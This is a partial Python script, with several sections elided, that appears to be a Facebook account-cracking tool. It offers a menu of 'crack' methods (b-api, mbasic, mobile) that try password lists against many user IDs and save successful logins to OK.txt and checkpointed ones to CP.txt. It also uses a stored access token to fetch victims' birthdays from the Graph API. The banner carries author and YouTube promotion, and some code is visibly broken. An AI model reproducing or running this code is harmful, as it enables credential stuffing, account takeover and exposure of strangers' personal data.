...
def hasil(ok,cp):
	if len(ok) != 0 or len(cp) != 0:
		...
		#IMTIAZ_BAIZID('\033[1;91mCHECK > %s'%(str(len(cp))));exit()
	else:
...
class __crack__:
	...
	def plerr(self):
		try:
			...
			IMTIAZ_BAIZID(' [*] Total ID : %s'%(len(self.id)))
		...
		if _jokowi_kontol_ in ('M', 'm'):
				...
				if pwek == '':
					...
					def _sempak_(bse=None):
						...
						if boy == '':
							...
							IMTIAZ_BAIZID('[•] Result CP saved to CP.txt')
							IMTIAZ_BAIZID('\n\tCrack Processing...\n')
							IMTIAZ_BAIZID('\n\tCrack Processing...\n\n');logo()
							...
							exit()
					IMTIAZ_BAIZID('\n01.) Metode b-api ')
					IMTIAZ_BAIZID('02.) Metode mbasic ')
					IMTIAZ_BAIZID('03.) Metode Mobile ')
					_sempak_(pwek.split(','))
					break
			...
			IMTIAZ_BAIZID('\n\t------[ Method Crack ]-----')
			print (' [*]=============================================')
			IMTIAZ_BAIZID(' [1] AS Method 1 ')
			IMTIAZ_BAIZID(' [2] AS Method 2  [ Pro ]')
			IMTIAZ_BAIZID(' [3] AS Method 3   ')
			print (' [*]=============================================')
			self.__pler__()
		else:
			exit()
	...
	def __api__(self, user, _sempak_):
		...
		for pw in _sempak_:
			...
			if "access_token" in p:
				IMTIAZ_BAIZID('\r\033[1;92m[Successful-AS] %s | %s%s      '%(user,pw,tahun(user)))
				...
				try:
					...
					IMTIAZ_BAIZID('\r\033[1;91m[Checkpoint-AS] %s | %s • %s %s %s%s      '%(user,pw,day,month,year,tahun(user)))
					...
					pass
				IMTIAZ_BAIZID('\r\033[1;91m[Checkpoint-AS] %s | %s%s      '%(user,pw,tahun(user)))
				wrt = '%s - %s%s' % (user,pw,tahun(user))
				cp.append(wrt)
				open('CP.txt','a').write('%s\n' % wrt)
				break
	...
	def __mbasic__(self, user, _sempak_):
		...
		for pw in _sempak_:
			...
			if 'c_user' in ses.cookies.get_dict():
				IMTIAZ_BAIZID('\r\033[1;32m[Successful-AS] %s | %s      ' % (user,pw))
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
				open('OK.txt','a').write('%s\n' % wrt)
				break
				...
				try:
					...
					cp_ttl = Prof_IMtiaz('https://graph.facebook.com/%s?access_token=%s'%(user,token)).json()['birthday']
					month, day, year = cp_ttl.split('/')
					month = bulan_ttl[month].IMTIAZ_BAIZID('\r\033[1;91m[Checkpoint-AS] %s | %s • %s %s %s%s      ' % (user,pw,day,month,year,tahun(user)))
					wrt = '%s - %s - %s %s %s%s' % (user,pw,day,month,year,tahun(user))
					cp.append(wrt)
					open('CP.txt','a').write('%s\n' % wrt)
					break
	...
	def __mfb__(self, user, _sempak_):
		...
		for pw in _sempak_:
			...
			if 'c_user' in ses.cookies.get_dict():
				IMTIAZ_BAIZID('\r\033[1;92m[Successful-AS] %s | %s      '%(user,pw))
				wrt = '%s - %s - %s' % (user,pw)
				ok.append(wrt)
				open('OK.txt','a').write('%s\n' % wrt)
				break
				...
				try:
					token = IMTIAZ('token.txt').read()
					cp_ttl = Prof_BAIZID('https://graph.facebook.com/%s?access_token=%s'%(user,token)).json()['birthday']
					month, day, year = cp_ttl.split('/')
					month = bulan_ttl[month]
					IMTIAZ_BAIZID('\r\033[1;91m[Checkpoint-AS] %s | %s  %s %s %s%s      ' % (user,pw,day,month,year,tahun(user)))
...
banner="""\033[1;37m
 ...
 [*]=============================================
    Author   : AKASH SUMON
    YouTube  : https://youtube.com/channel/UCEDgcKiivvepcsKJFxQkAFg
    Team     : FUCK YOU 
    Connect  : 😜
 [*]=============================================
...
def dupcutter():
	os.system("xdg-open https://wa.me/+88011409808749")
	time.sleep(3)
	readline___Public_Xml()
def sep():
	logo()
